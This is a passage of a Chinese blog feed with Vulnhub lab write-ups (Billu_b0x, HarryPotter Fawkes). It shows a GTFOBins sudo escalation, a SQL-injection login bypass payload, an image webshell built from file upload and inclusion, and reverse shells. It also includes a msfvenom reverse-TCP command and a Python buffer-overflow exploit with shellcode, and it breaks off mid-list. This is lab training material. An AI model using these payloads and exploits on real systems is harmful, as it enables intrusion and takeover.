<p>果不其然，成功得到<code>thor</code>的权限。第一个flag在<code>/home/thor/user.txt</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160245.png" /></p>
<p>然后需要想办法提权到root，再次查看sudo配置<code>sudo -l</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160315.png" /></p>
<p>这里涉及到<strong>GTFOBins提权：针对目标系统自带的应用程序配置不当导致提权</strong>，参考链接：<a
href="https://gtfobins.github.io">gtfobins</a></p>
<p>网站中提到</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160423.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160429.png" /></p>
<p>因为我们需要提权到root，所以使用后者中的<code>Shell</code>的命令，也就是如下命令：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/sbin/service ../../bin/bash</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160607.png" /></p>
<p>成功提权到root！接下来获取第二个flag<code>/root/root.txt</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160550.png" /></p>
<p>其实也可以通过<code>/usr/bin/cat</code>直接读取flag。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160915.png" /></p>
<p>本台靶机到此结束！</p>
<h1 id="总结">总结</h1>
<p>该靶机的难度主要在于<strong>破壳漏洞</strong>的发现以及
<strong>GTFOBins漏洞</strong>利用。练习这么多个靶机以来第一次碰到这样的漏洞以及利用方式。</p>
<p>还有一点，就是如果发现目标站点使用的是开源的框架，可以尝试以下默认的账号和密码。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>破壳漏洞</tag>
        <tag>开源源码泄露</tag>
        <tag>GTFOBins提权</tag>
      </tags>
  </entry>
  <entry>
    <title>11 Vulnhub Billu_b0x Writeup</title>
    <url>/2022/04/14/11%20Vulnhub%20Billu_b0x%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度为中等，不过存在多种思路。肯定还有一些我没有记录到。该靶机的漏洞都比较常规，但是组合起来就有了非常好的表现！</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a
href="https://www.vulnhub.com/entry/billu-b0x,188/">Billu_b0x</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中（多种攻击路线）</li>
</ul>
<p>目标：</p>
<ul>
<li>取得root权限</li>
</ul>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>Web信息收集（关注配置信息）</li>
<li>SQL注入（sqlmap无法得到结果）</li>
<li>文件包含漏洞</li>
<li>文件上传漏洞</li>
<li>任意文件读取漏洞</li>
<li>源码审计</li>
<li>内核漏洞提权</li>
</ul>
<p>导入虚拟机的时候，注意红框中的选择！！！否则会扫不到IP。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413121446.png" /></p>
<h1 id="渗透-1">渗透-1</h1>
<h2
id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.15</span><br><span class="line">sudo nmap -p22,80 -sV 10.0.2.15</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414190943.png" /></p>
<ul>
<li>22端口的服务为ssh</li>
<li>80端口的服务为http，apache2.2.22</li>
<li>靶机操作系统为Ubuntu</li>
</ul>
<h2 id="访问http服务">访问http服务</h2>
<p>直接访问80端口，该界面存在SQL注入，但是很难！！！常规的方法没有什么作用，不过可以通过burp爆破，需要的字典比较大，最好有pro版本跑。（我反正没做出来）</p>
<p>接下来常规的进行一下路径扫描，发现了许多东西！！！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414192633.png" /></p>
<p>里面有非常多的漏洞！！！还有许多关键信息，这里先展示第一种利用方式所用到的，剩下的会在其他攻击路线中提到。</p>
<p>关注<code>test.php</code>这个文件（url中输入<code>test</code>会被定位到<code>test.php</code>），发现一句提示
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;file&#x27; parameter is empty. Please provide file path in &#x27;file&#x27; parameter</span><br></pre></td></tr></table></figure></p>
<p>经过测试发现需要用POST方式提交参数file，然后就会发现，这里存在<strong>任意文件读取漏洞</strong>！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414192915.png" /></p>
<p>成功得到<code>index.php</code>的源码，当然也可以得到其他的源码或者其他文件的内容！！！</p>
<h2 id="sql注入">SQL注入</h2>
<h3 id="爆破">爆破</h3>
<p>攻击方式</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414191708.png" /></p>
<p>第一个字典选择：<code>/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414191738.png" /></p>
<p>第二个字典选择：（只有pro版才有）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414191859.png" /></p>
<p>然后可以跑出来！</p>
<h3 id="绕过单引号过滤">绕过单引号过滤</h3>
<p>通过<code>test.php</code>的任意文件读取漏洞，得到了<code>index.php</code>的源码，直接给出关键的源码信息：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;un&#x27;</span>]));</span><br><span class="line"><span class="variable">$pass</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;ps&#x27;</span>]));</span><br><span class="line"><span class="variable">$run</span>=<span class="string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="variable">$pass</span>.<span class="string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>首先关注一下查询那句代码，现在这样子明显太复杂了，我们把它简化一下。首先，因为<code>$run</code>最外面使用的是单引号，所以在内部的单引号前面需要加上转义字符。因此真正的查询语句实际如下：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span> auth where  pass=<span class="string">&#x27;[密码]&#x27;</span> <span class="keyword">and</span> uname=<span class="string">&#x27;[账号]&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>为了方便观看，我将我们输入的部分用<code>[]</code>包括起来了，并且<code>$run</code>和头尾的单引号我都去掉了。</p>
<p>直接给出一个payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">un=or 1=1#&amp;ps=\</span><br></pre></td></tr></table></figure></p>
<p>将上述payload带入查询语句中： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span> auth where pass=<span class="string">&#x27;\&#x27; and uname=&#x27;</span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>分析，因为我们输入了一个<code>\</code>，使得上面语句中的第二个单引号失去了与前面单引号闭合的功能，仅仅作为一个单引号被查询。那么第一个单引号就会和第三个单引号闭合，使得<code>or 1=1</code>逃逸，然后<code>#</code>又把最后的单引号注释掉了。因此，此时查询的信息应该如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. pass = \&#x27; and uname=</span><br><span class="line">2. uname 没了</span><br></pre></td></tr></table></figure></p>
<p>因此，<code>where</code>后面的两个判断条件变成了一个，并且多了一句<code>or 1=1</code>。因为后者为1，并且是<code>or</code>，所以这句查询语句一定为真，直接登陆成功！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414192522.png" /></p>
<p>直接页面输入对应的信息即可成功登录！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414193115.png" /></p>
<h2
id="文件上传和文件包含配合图片反弹shell">文件上传和文件包含配合——图片🐎反弹shell</h2>
<p>发现<code>add users</code>下面存在着文件上传漏洞，经过测试发现只能够上传后缀、<code>content-type</code>、<code>MIME</code>都为图片的文件，简单来说就是只能上传图片，但是图片的内容可以是一句话。（也可以通过<code>test.php</code>读取<code>panel.php</code>的源码）</p>
<p>接下来想着既然不能上传<code>php</code>文件，那么是否存在文件包含漏洞？如果有的话就可以两者配合实现图片🐎。</p>
<blockquote>
<p>图片🐎：后缀、MIME和Content-Type都是图片的格式，只是图片的内容是一句话木马。此时如果图片的内容能够被解析并且当作代码执行，就可以执行木马！此时木马的内容不要为POST，最好为GET，然后直接反弹shell或者写一句话到php中，然后上线蚁剑。
原因：该靶机中的加载图片马是POST中的参数load提供的，此时如果需要上线蚁剑，也需要POST提交内容，当前情况下无法实现。如果加载图片是GET完成的，那么可以同时POST提交命令，此时才可以上线蚁剑。<a
href="https://hdfzzf.icu/2022/04/16/NPUCTF2020%20ReadlezPHP/">NPUCTF2020
Readl</a>中有尝试。</p>
</blockquote>
<p>我们抓取一下数据包，发现当我们切换到<code>add users</code>或者<code>show users</code>时</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414195046.png" /></p>
<p>而刚刚路径扫描得到一个<code>add</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414195202.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414195219.png" /></p>
<p>发现两者非常类似，因此可以猜测通过<code>load=filename</code>可以包含其他文件。尝试一下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414195344.png" /></p>
<p>确认存在文件包含漏洞！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果：/etc/passwd 没有效果，可以尝试以下下面的payload，绕过无法从当前目录访问的限制</span><br><span class="line">../../../../../../../../../etc/payload</span><br></pre></td></tr></table></figure>
<p>有多种方式利用图片🐎：</p>
<ul>
<li>写入命令执行代码，然后执行对应的命令；（此时也可以输入对应命令，执行后面两者）</li>
<li>往有写入权限的的目录或文件写入一句话，然后上线蚁剑</li>
<li>直接写入反弹shell的命令；</li>
</ul>
<h3 id="第一种第二种">第一种+第二种</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414201033.png" /></p>
<p>必须使用<code>system</code>，<code>eval</code>没用！不知道原因！</p>
<p>然后上传，到<code>show users</code>界面就可以查看对应的图片地址</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414200103.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.15/uploaded_images/1.gif</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令执行：</span><br><span class="line">1. </span><br><span class="line">load=uploaded_iamges/1.gif?cmd=ls</span><br><span class="line">经尝试，不行</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">可以在panel.php?cmd=ls -l</span><br><span class="line">load=uploaded_iamges/1.gif</span><br></pre></td></tr></table></figure>
<p>注意<code>ls -l</code>需要url编码，否则无法执行！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414201247.png" /></p>
<p>发现<code>uploaded_images</code>我们有全部的权限，因此直接执行命令，写入一句话</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414201640.png" /></p>
<hr />
<p>也可以写入这样的命令直接反弹shell</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203321.png" /></p>
<p>也可以不用url编码，直接ascii码编码</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203455.png" /></p>
<hr />
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414201652.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414201711.png" /></p>
<p>上线成功！</p>
<h3 id="第三种">第三种</h3>
<p>直接使用<code>/usr/share/webshells/php/php-reverse-shell.php</code></p>
<p>做如下修改</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414202416.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414202428.png" /></p>
<p>先在kali开启监听，然后<code>load=uploaded_images/php-reverse-shell.gif</code>直接发送数据包</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414202614.png" /></p>
<p>成功反弹shell！</p>
<h2 id="权限提升">权限提升</h2>
<p><code>uname -a</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414202705.png" /></p>
<p>发现系统内核版本很低，大概率存在内核漏洞。直接使用第一周的exp即可。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414202847.png" /></p>
<p>需要注意的是，对方靶机存在<code>gcc</code>，即可以进行c文件编译。所以直接把c文件传到靶机，编译执行就好。切记别编译完传过去！！！编译环境不同，可能导致无法在对方机子上运行！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203156.png" /></p>
<p>成功提权到root！</p>
<h1 id="渗透-2">渗透-2</h1>
<p>刚刚路径扫描中有一个<code>c</code>文件，直接用<code>test.php</code>读取其中的内容</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203553.png" /></p>
<p>其中 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysqli_connect(ip, username, password, dbname);</span><br></pre></td></tr></table></figure></p>
<p>直接获得了用户名和密码。</p>
<p>路径扫描中还扫描出了<code>/phpmy</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203828.png" /></p>
<p>登录成功！</p>
<p>在表<code>auth</code>中找到用户名和密码。可以从index.php的源码中看到，sql查询语句就是带入这个表查询的，因此直接使用下面的用户名和密码可以直接登录，就不用sql注入了。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414203922.png" /></p>
<p>登录之后的步骤和[[#SQL注入]]]之后的步骤一样了。</p>
<h1 id="渗透-3">渗透-3</h1>
<h2 id="phpmysql的配置信息">phpmysql的配置信息</h2>
<p>通常用php+MySQL搭建web应用的时候会生成一个网页的管理系统，一般文件为<code>phpmy</code>或者<code>phpmyadmin</code>。</p>
<p>还会生成配置信息文件<code>phpmy/config.inc.php</code>或者<code>phpmyadmin/config.inc.php</code></p>
<h2 id="利用">利用</h2>
<p>再次扫描（每次扫描到新的目录都要接着往下扫描） <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.15/phpmy/</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414204317.png" /></p>
<p>注意红框的两个文件，直接用<code>test.php</code>读取其中的内容</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414204443.png" /></p>
<p>又得到了一个用户名和密码，比较特殊的是用户名是<code>root</code>，尝试了一下发现既不是sql注入那的，也不是<code>phpmy</code>的登录信息，忽然想到端口扫描中，22端口开启了ssh服务，故尝试直接连接</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220414204734.png" /></p>
<p>直接获得root权限！</p>
<h1 id="总结">总结</h1>
<p>该靶机非常好！！！涉及的攻击技术都非常的常见，并且比较常规。但是就是这些常规的漏洞的组合，却有了很好的表现，比如文件上传和文件包含实现的图片🐎、任意文件读取加上源码审计绕过sql注入、已经强行爆破sql注入等等。值得多次复习！</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>源码审计</tag>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>图片马</tag>
        <tag>任意文件读取</tag>
      </tags>
  </entry>
  <entry>
    <title>12 Vulnhub HarryPotterFawkes Writeup</title>
    <url>/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度为高，主要的难点在于缓冲区溢出漏洞的利用以及堆溢出漏洞攻击。其次在于FTP服务攻击和流量抓包分析，这两者在之前的靶机中从没遇到过。</p>
<span id="more"></span>
<h1 id="靶机信息">1 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a
href="https://www.vulnhub.com/entry/harrypotter-fawkes,686/">HarryPotter:Fawkes</a></li>
<li>这是一个系列的靶机，漏洞都非常的奇特！</li>
</ul>
<p>难度：</p>
<ul>
<li>高</li>
</ul>
<p>目标：</p>
<ul>
<li><p>取得2个root权限</p></li>
<li><p>拿到3个Flag</p></li>
</ul>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>web信息收集</li>
<li><strong>FTP服务攻击</strong></li>
<li><strong>缓冲区溢出</strong></li>
<li><strong>模糊测试</strong></li>
<li>漏洞利用代码编写</li>
<li><strong>流量抓包分析</strong></li>
<li><strong>堆溢出漏洞攻击</strong></li>
<li>Metasploit（MSF）</li>
<li>手动修复EXP代码</li>
<li>本地提权</li>
</ul>
<p>参考资料：</p>
<ul>
<li><a
href="https://github.com/worawit/CVE-2021-3156">CVE-2021-3156</a></li>
<li>https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</li>
</ul>
<h1 id="渗透">2 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.16</span><br><span class="line">sudo nmap -p21,22,80,2222,9898 -A 10.0.2.16</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416151956.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152011.png" /></p>
<p>信息如下：</p>
<ul>
<li>21端口的服务是ftp，版本为vsfttpd
3.0.3，可以匿名登录，并且存在一个文件<code>server_hogwarts</code></li>
<li>22端口的服务是ssh，版本是OpenSSH 7.9，</li>
<li>80端口的服务是http，版本为Apache 2.4.38</li>
<li>2222端口的服务也是ssh，版本为OpenSSH 2.4.38</li>
<li>9898端口的服务未知，所以随便给了一个monkeycom</li>
<li>靶机的操作系统为Debian</li>
</ul>
<h2 id="访问http服务">2.2 访问http服务</h2>
<p>直接访问80端口，发现这个网页非常的刚进，只有一张图片。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152214.png" /></p>
<p>因此尝试进行路径扫描，也没有什么有用的发现</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152340.png" /></p>
<h2 id="访问ftp服务">2.3 访问ftp服务</h2>
<p>在http上没有有用的发现，接下来直接利用ftp匿名登录上去，并下载对应的那个文件。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp 10.0.2.16 21</span><br><span class="line">用户名输入：anonymous</span><br><span class="line">密码为空，直接enter</span><br></pre></td></tr></table></figure></p>
<p>登录进去之后，利用<code>get server_hogwarts</code>下载对应文件到本地，接下来我想查看一下其他目录的东西，发现除了下载对应的文件，不能进行任何操作。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416153338.png" /></p>
<h2 id="缓冲区溢出漏洞">2.4 缓冲区溢出漏洞</h2>
<p>到目前为止，http服务没信息，ssh没有用户和密码，9898都不知道什么服务，只有刚刚下载的一个文件，先查看一下文件类型</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file server_hogwarts</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416153531.png" /></p>
<p>信息：</p>
<ul>
<li>该文件是一个二进制的可执行文件（elf是Linux的可执行文件格式），并且是32位的</li>
<li>说明对方系统是能够运行32位的软件，即<code>x86</code>架构</li>
</ul>
<p>首先执行这文件看一下会发生什么，结果是无事发生，查看进程是否存在对应的进程，发现确实存在</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154319.png" /></p>
<p>查看其所在的端口</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154459.png" /></p>
<p>发现开了9898端口，联想到端口扫描的时候，靶机上也开了9898端口，因此，靶机上的9898端口对应的服务应该就是这个。现在本地用nc连接上看一下该服务的功能。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154637.png" /></p>
<p>功能非常简单，我们输入对应的字符串，服务返回对应的字符串，就一个功能点。连接靶机的9898端口，发现功能是一模一样的，接下来只能通过查看该文件是否存在缓冲区溢出漏洞来判断靶机上也存在相应的漏洞。</p>
<p>在测试之前，需要先把aslr关掉。</p>
<blockquote>
<p>该技术简单来说就是每次启用程序的时候的内存地址总是随机的，这样子即使存在缓冲区溢出漏洞，也会因为每次启动程序的地址不同导致第一次出现漏洞的地址A和第二次出现漏洞的地址B不同，使得即使存在漏洞也无法利用。</p>
</blockquote>
<p>查看是否开启：（0是禁用；1，2表示开启，2是在1的基础上进一步打开堆地址随机化）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416155246.png" /></p>
<p>输入以下命令禁用： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo root <span class="comment"># 需要先切换到root才可以，否则权限不够</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p>
<p>利用图形化工具edb-debugger进行查找。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install edb-debugger <span class="comment"># 安装</span></span><br></pre></td></tr></table></figure></p>
<h3 id="查找漏洞">2.4.1 查找漏洞</h3>
<p>生成一个300个A的字符串，然后输入到唯一的功能点中，发现edb-debugger提示出错了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416155927.png" /></p>
<p>说明这里确实存在漏洞，接下来生成不重复的字符串判断一下是哪几个A出现在了EIP寄存器中。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf-pattern_create -l 300</span><br><span class="line"></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416160325.png" /></p>
<p>此时EIP中的值为<code>64413764</code>，即<code>d7Ad</code>（注意需要反过来），然后查找该子串在原来字符串中的偏移量
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf-pattern_offset</span><br><span class="line"></span><br><span class="line">Exact match at offset 112</span><br></pre></td></tr></table></figure></p>
<p>生成字符串确定一下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;print(&#x27;A&#x27;*112 + &#x27;hdfs&#x27; + &#x27;C&#x27;*50)&quot;</span></span><br><span class="line"></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhdfsCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416162156.png" /></p>
<p>成功找到漏洞所在。那么该如何利用呢？这里不像之前，不存在有漏洞的函数可以利用。首先得知道一个基础知识：</p>
<blockquote>
<ol type="1">
<li>EIP寄存器里存储的是CPU下次要执行的指令的地址；</li>
<li>EBP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</li>
<li>ESP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</li>
</ol>
</blockquote>
<p>（我对汇编不熟悉）简单说下我的理解：如果存在漏洞的函数，可以将EIP中的值修改为对应函数的地址，然后CPU就会自动执行存在漏洞的函数。像该靶机，不存在漏洞函数，可以通过EIP让CPU执行ESP寄存器中的指令，即<code>jmp esp</code>指令。我们提前在ESP中写入反弹shell的指令（可以用msf生成）。</p>
<h3 id="利用漏洞">2.4.2 利用漏洞</h3>
<p>从查找漏洞的过程来看，ESP寄存器是可写入的，并且会将EIP之后的内容（即hdfs之后的内容）全部写入ESP。因此，我们先利用msf生成反弹shell的指令：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 -b <span class="string">&quot;\x00&quot;</span> -f py <span class="comment"># 生成python可利用的</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416163915.png" /></p>
<p>然后查找<code>jmp esp</code>指令的地址，利用<code>Plugins-&gt;Opcode Search</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416164843.png" /></p>
<p>要找到可执行权限的进程，然后<code>ESP-&gt;EIP</code>（个人理解：将ESP指令传给EIP）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416164946.png" /></p>
<p>记住地址，写入payload的时候记得反过来！</p>
<p>然后编写利用脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys,socket</span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbb\x77\x58\x1b\xb6\xda\xc6\xd9\x74\x24\xf4\x5a\x2b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\xb1\x12\x31\x5a\x12\x03\x5a\x12\x83\xb5\x5c\xf9&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x43\x08\x86\x0a\x48\x39\x7b\xa6\xe5\xbf\xf2\xa9\x4a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd9\xc9\xaa\x38\x7c\x62\x95\xf3\xfe\xcb\x93\xf2\x96&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc1\x63\x07\x62\xbe\x61\x07\x7b\x62\xef\xe6\xcb\xfc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbf\xb9\x78\xb2\x43\xb3\x9f\x79\xc3\x91\x37\xec\xeb&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x66\xaf\x98\xdc\xa7\x4d\x30\xaa\x5b\xc3\x91\x25\x7a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x53\x1e\xfb\xfd&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span> + <span class="string">&#x27;\x55\x9d\x04\x08&#x27;</span> + <span class="string">&#x27;\x90&#x27;</span>*<span class="number">32</span>  + buf</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9898</span>))</span><br><span class="line">    s.send((payload))</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;something wrong!&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure></p>
<p>解释：</p>
<ul>
<li>最开始的<code>#! /usr/bin/python</code>：当我们输入<code>./exp.py</code>时，默认最开始<code>#!</code>中的执行；</li>
<li><code>'\x90'*32*</code>：<code>\x90</code>空，读到该字节就会继续读取下一个。这是一个技巧，使程序更稳定。如果代码的字节很紧凑，可能执行过程不会按照预期，适当的插入null不会影响执行过程，反而能够使程序的运行更加稳定。</li>
<li>不能用python3，否则会因为payload中既有字节又有字符而报错！</li>
</ul>
<p>接着：</p>
<ol type="1">
<li>启动服务</li>
<li>监听4444端口</li>
